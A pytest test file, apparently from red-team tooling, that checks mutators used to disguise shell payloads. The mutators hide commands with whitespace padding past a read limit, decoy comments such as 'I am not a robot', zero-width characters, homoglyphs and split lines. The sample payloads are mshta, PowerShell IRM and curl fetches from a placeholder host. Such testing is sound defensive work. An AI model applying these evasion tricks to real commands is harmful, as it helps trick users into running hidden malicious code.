# Seeded RNGs drive the mutators; not crypto.
# ruff: noqa: S311
import random

import pytest

from redteam.models import Shell
from redteam.mutate import _kw, get
from redteam.mutate.common import (
    HOMOGLYPHS,
    READ_LIMIT_CHARS,
    ZERO_WIDTH,
)

EXAMPLES = {
    Shell.CMD: 'ms' + 'hta https://example.invalid/a',
    Shell.POWERSHELL: f'{_kw.IRM} https://example.invalid/a | Write-Output',
    Shell.SH: 'curl -fsSL https://example.invalid/a -o x',
    Shell.BASH: 'curl -fsSL https://example.invalid/a -o x',
    Shell.ZSH: 'curl -fsSL https://example.invalid/a -o x',
    Shell.APPLESCRIPT: 'display dialog "x"',
}


@pytest.mark.parametrize('shell', list(Shell))
def test_padding(shell):
    payload = EXAMPLES[shell]
    sizes = set()
    for k in range(60):
        out = get('common.padding', shell)(payload, random.Random(k))
        assert out.strip() == payload
        sizes.add(len(out) - len(payload))
    assert max(sizes) > READ_LIMIT_CHARS


def test_padding_refuses_trailing_set_value():
    m = get('common.padding', Shell.CMD)
    outs = {m('set x=ab', random.Random(k)) for k in range(20)}
    assert all(o is None or o.endswith('set x=ab') for o in outs)


@pytest.mark.parametrize('shell', list(Shell))
def test_decoy_comment(shell):
    payload = EXAMPLES[shell]
    out = get('common.decoy_comment', shell)(payload, random.Random(0))
    assert out.startswith(payload)
    prefix = {Shell.CMD: ' & rem ', Shell.APPLESCRIPT: ' -- '}.get(shell, ' # ')
    assert prefix in out[len(payload) :]


def test_decoy_rewrites_existing_comment():
    payload = f'{_kw.PWSH} -c "Get-Date" # I am not a robot'
    m = get('common.decoy_comment', Shell.POWERSHELL)
    out = m(payload, random.Random(1))
    assert out.startswith(f'{_kw.PWSH} -c "Get-Date" # ')
    assert out.count('#') == 1


@pytest.mark.parametrize('shell', list(Shell))
def test_zero_width_and_homoglyph_are_probes(shell):
    payload = EXAMPLES[shell]
    zw = get('common.zero_width', shell)
    hg = get('common.homoglyph', shell)
    fw = get('common.fullwidth', shell)
    assert not zw.semantic and not hg.semantic and not fw.semantic
    out = zw(payload, random.Random(0))
    assert ''.join(c for c in out if c not in ZERO_WIDTH) == payload
    out = hg(payload, random.Random(0))
    back = {v: k for k, v in HOMOGLYPHS.items()}
    assert ''.join(back.get(c, c) for c in out).lower() == payload.lower()
    out = fw(payload, random.Random(0))
    assert out != payload and len(out) == len(payload)


@pytest.mark.parametrize(
    ('shell', 'cont'),
    [
        (Shell.CMD, ' ^\n'),
        (Shell.POWERSHELL, ' `\n'),
        (Shell.SH, ' \\\n'),
        (Shell.BASH, ' \\\n'),
        (Shell.ZSH, ' \\\n'),
    ],
)
def test_newline_split(shell, cont):
    payload = EXAMPLES[shell]
    m = get('common.newline_split', shell)
    for k in range(10):
        out = m(payload, random.Random(k))
        assert cont in out
        assert out.replace(cont, ' ') == payload


def test_newline_split_cmd_refusals():
    m = get('common.newline_split', Shell.CMD)
    assert m('curl x | sort', random.Random(0)) is None
    assert m('echo %PATH% x', random.Random(0)) is None
